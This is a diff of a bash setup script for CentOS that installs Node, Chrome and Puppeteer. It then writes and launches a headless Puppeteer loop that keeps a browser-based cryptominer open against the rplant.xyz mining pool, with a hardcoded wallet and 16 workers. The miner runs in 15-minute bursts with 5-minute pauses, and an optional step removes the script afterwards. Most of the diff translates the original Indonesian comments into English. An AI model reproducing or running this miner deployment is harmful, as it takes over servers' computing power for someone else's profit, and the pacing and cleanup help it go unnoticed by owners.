@@ -1,18 +1,18 @@
 #!/bin/bash
 
-# Update sistem CentOS
+# Update CentOS system
 sudo yum update -y
 
-# Instal NVM (Node Version Manager)
-curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
+# Install NVM (Node Version Manager)
+curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash
 
-# Sumberkan .bashrc untuk mengaktifkan NVM
+# Source .bashrc to enable NVM
 source ~/.bashrc
 
-# Instal Node.js versi 18 menggunakan NVM
+# Install Node.js version 18 using NVM
 nvm install 18
 
-# Instal dependensi yang diperlukan untuk Chrome, Puppeteer, dan npx
+# Install dependencies required for Chrome, Puppeteer, and npx
 sudo yum install -y \
   gconf-service \
   libXcomposite \
@@ -58,51 +58,50 @@ sudo yum install -y \
   liberation-serif-fonts \
   liberation-mono-fonts
 
-# Instal Google Chrome
+# Install Google Chrome
 sudo curl -o /etc/yum.repos.d/google-chrome.repo https://dl.google.com/linux/chrome/rpm/stable/x86_64/google-chrome.repo
 sudo yum install -y google-chrome-stable
 
-# Instal Puppeteer dan npx secara global
-npm install puppeteer npx
+# Install Puppeteer and npx globally
+npm install -g puppeteer npx
 
-# Menggunakan npx untuk menginstal Chrome yang kompatibel dengan Puppeteer
+# Use npx to install compatible Chrome for Puppeteer
 npx puppeteer browsers install
 
-# Buat dan jalankan skrip Puppeteer
+# Create and run Puppeteer script
 cat <<EOF > puppeteer_script.js
 const puppeteer = require('puppeteer');
 
 (async () => {
-  const browser = await puppeteer.launch({ headless: true });
-  const page = await browser.newPage();
-  await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=16');
-
-  // Fungsi untuk menjalankan browser selama periode aktif
-  const runPeriod = async (durationMs) => {
-    console.log('Browser mulai berjalan.');
-    await new Promise(resolve => setTimeout(resolve, durationMs));
-    console.log('Browser berhenti.');
-    await browser.close();
-  };
-
-  // Periode aktif dan istirahat
-  const activePeriod = 15 * 60 * 1000; // 15 menit dalam milidetik
-  const restPeriod = 5 * 60 * 1000; // 5 menit dalam milidetik
-
-  // Loop untuk periode aktif dan istirahat
+  let browser;
   while (true) {
-    await runPeriod(activePeriod);
-    await new Promise(resolve => setTimeout(resolve, restPeriod));
-    // Buka browser kembali untuk periode aktif berikutnya
-    browser = await puppeteer.launch({ headless: true });
-    page = await browser.newPage();
-    await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=16');
+    try {
+      browser = await puppeteer.launch({ headless: true });
+      const page = await browser.newPage();
+      await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=16');
+      
+      const runPeriod = async (durationMs) => {
+        console.log('Browser started.');
+        await new Promise(resolve => setTimeout(resolve, durationMs));
+        console.log('Browser stopped.');
+        await browser.close();
+      };
+
+      const activePeriod = 15 * 60 * 1000; // 15 minutes in milliseconds
+      const restPeriod = 5 * 60 * 1000;   // 5 minutes in milliseconds
+
+      await runPeriod(activePeriod);
+      await new Promise(resolve => setTimeout(resolve, restPeriod));
+    } catch (error) {
+      console.error('Error occurred:', error);
+      if (browser) await browser.close();
+    }
   }
 })();
 EOF
 
-# Jalankan skrip Puppeteer menggunakan Node.js
+# Run Puppeteer script using Node.js
 node puppeteer_script.js
 
-# Hapus skrip Puppeteer setelah selesai (opsional)
+# Optionally remove Puppeteer script after completion
 # rm puppeteer_script.js
